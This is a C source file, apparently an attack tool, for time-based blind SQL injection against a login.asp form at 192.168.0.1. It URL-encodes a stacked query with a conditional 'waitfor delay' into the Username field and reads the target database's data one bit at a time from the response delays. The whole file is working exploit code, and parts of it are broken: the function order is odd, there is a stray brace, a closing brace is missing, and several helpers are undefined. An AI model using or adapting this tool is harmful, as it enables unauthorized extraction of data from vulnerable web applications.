int main( int argc, char *argv[] )
{
      int i, t;
      HANDLE h_thread[32];

      memset( out, 0, 1024 * 64 );

      if ( argc != 4 )
            return syntax();

      query = argv[1];
      bit_start = atoi( argv[2] );
      bit_end = atoi( argv[3] );

      for( i = bit_start; i < bit_end; i += 1 )
      {
            for( t = 0; t < 1; t++ )
            {
            h_thread[t] = (HANDLE)_beginthread( thread_proc, 0, (void *)(i+t) );
            }

            if ( WaitForMultipleObjects( 1, h_thread, TRUE, 30000 ) == WAIT_TIMEOUT )
            {
                  printf( "Error - timeout waiting for response\n" );
                  return 1;
            }

            if ( ( out[ i / 8 ] == 0 ) && ( out[ (i / 8) - 1 ] == 0 ) )
            {
                  printf("Done!\n");
                  return 0;
            }
      }
      return 0;
}
  

int create_get_bit_request( char *query, int bit, char *request, int buff_len )
{
      char params[ 1024 * 64 ] = "";
      char content_length[32] = "";
      char tmp[32] = "";
      char query_string[1024 * 64] = "";
      int i;

      // create bit-retriveal query string      
      safe_strcat( query_string, "'; ", buff_len );
      safe_strcat( query_string, query, buff_len );
      
      sprintf( params, " if (ascii(substring(@s, %d, 1)) & ( power(2, %d))) > 0 waitfor delay '0:0:4'--", (bit / 8)+1, bit % 8 );
      safe_strcat( query_string, params, buff_len );
      
      params[0] = 0;

      safe_strcat( request, "POST /login.asp HTTP/1.1\r\n", buff_len ); 
      safe_strcat( request, "Content-Type: application/x-www-form-urlencoded\r\n", buff_len ); 
      safe_strcat( request, "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Q312461)\r\n", buff_len ); 
      safe_strcat( request, "Host: 192.168.0.1\r\n", buff_len ); 
      safe_strcat( request, "Connection: Close\r\n", buff_len ); 
      safe_strcat( request, "Cache-Control: no-cache\r\n", buff_len ); 

      safe_strcat( params, "submit=Submit&Password=&Username=", 1024 * 64 );

      
      for( i = 0; i < (int)strlen( query_string ); i++ )
      {
            sprintf( tmp, "%%%x", query_string[i] );
            safe_strcat( params, tmp, 1024 * 64 );
      }

      sprintf( content_length, "%d", strlen( params ) );

      safe_strcat( request, "Content-Length: ", buff_len );
      safe_strcat( request, content_length, buff_len );
      safe_strcat( request, "\r\n\r\n", buff_len );

      safe_strcat( request, params, buff_len );

      return 1;
}


}

int thread_proc( int bit )
{
      char request[ 1024 * 64 ] = "";
      int num_zeroes = 0;

      request[0] = 0;
      create_get_bit_request( query, bit, request, 1024 * 64 );
      do_time_web_request( request, bit, out, len );

      printf( "String = %s\n", out );

      return 0;
}

int do_time_web_request( char *request, int bit, char *out_string, int len )
{
      char output[ 1024 * 64 ];
      int out_len = 1024 * 64;
      DWORD start;
      int byte = bit / 8;
      int bbit = bit % 8;

      start = GetTickCount();

      memset( output, 0, (1024 * 64) );
      
      Sleep(2000);

      WebGet( "192.168.0.1", 80, 0, request, output, &out_len );

      if ( ( GetTickCount() - start ) > 4000 )
      {
            printf( "bit %d\t=1\n", bit );

            // set the bit
            if ( byte <= len )
                  out_string[byte] = out_string[byte] | (1 << bbit);
            else
                  printf("error - output string too short" );

            return 1;
      }
      else
      {
            printf( "bit %d\t=0\n", bit );

            return 0;
      }

      return 1;
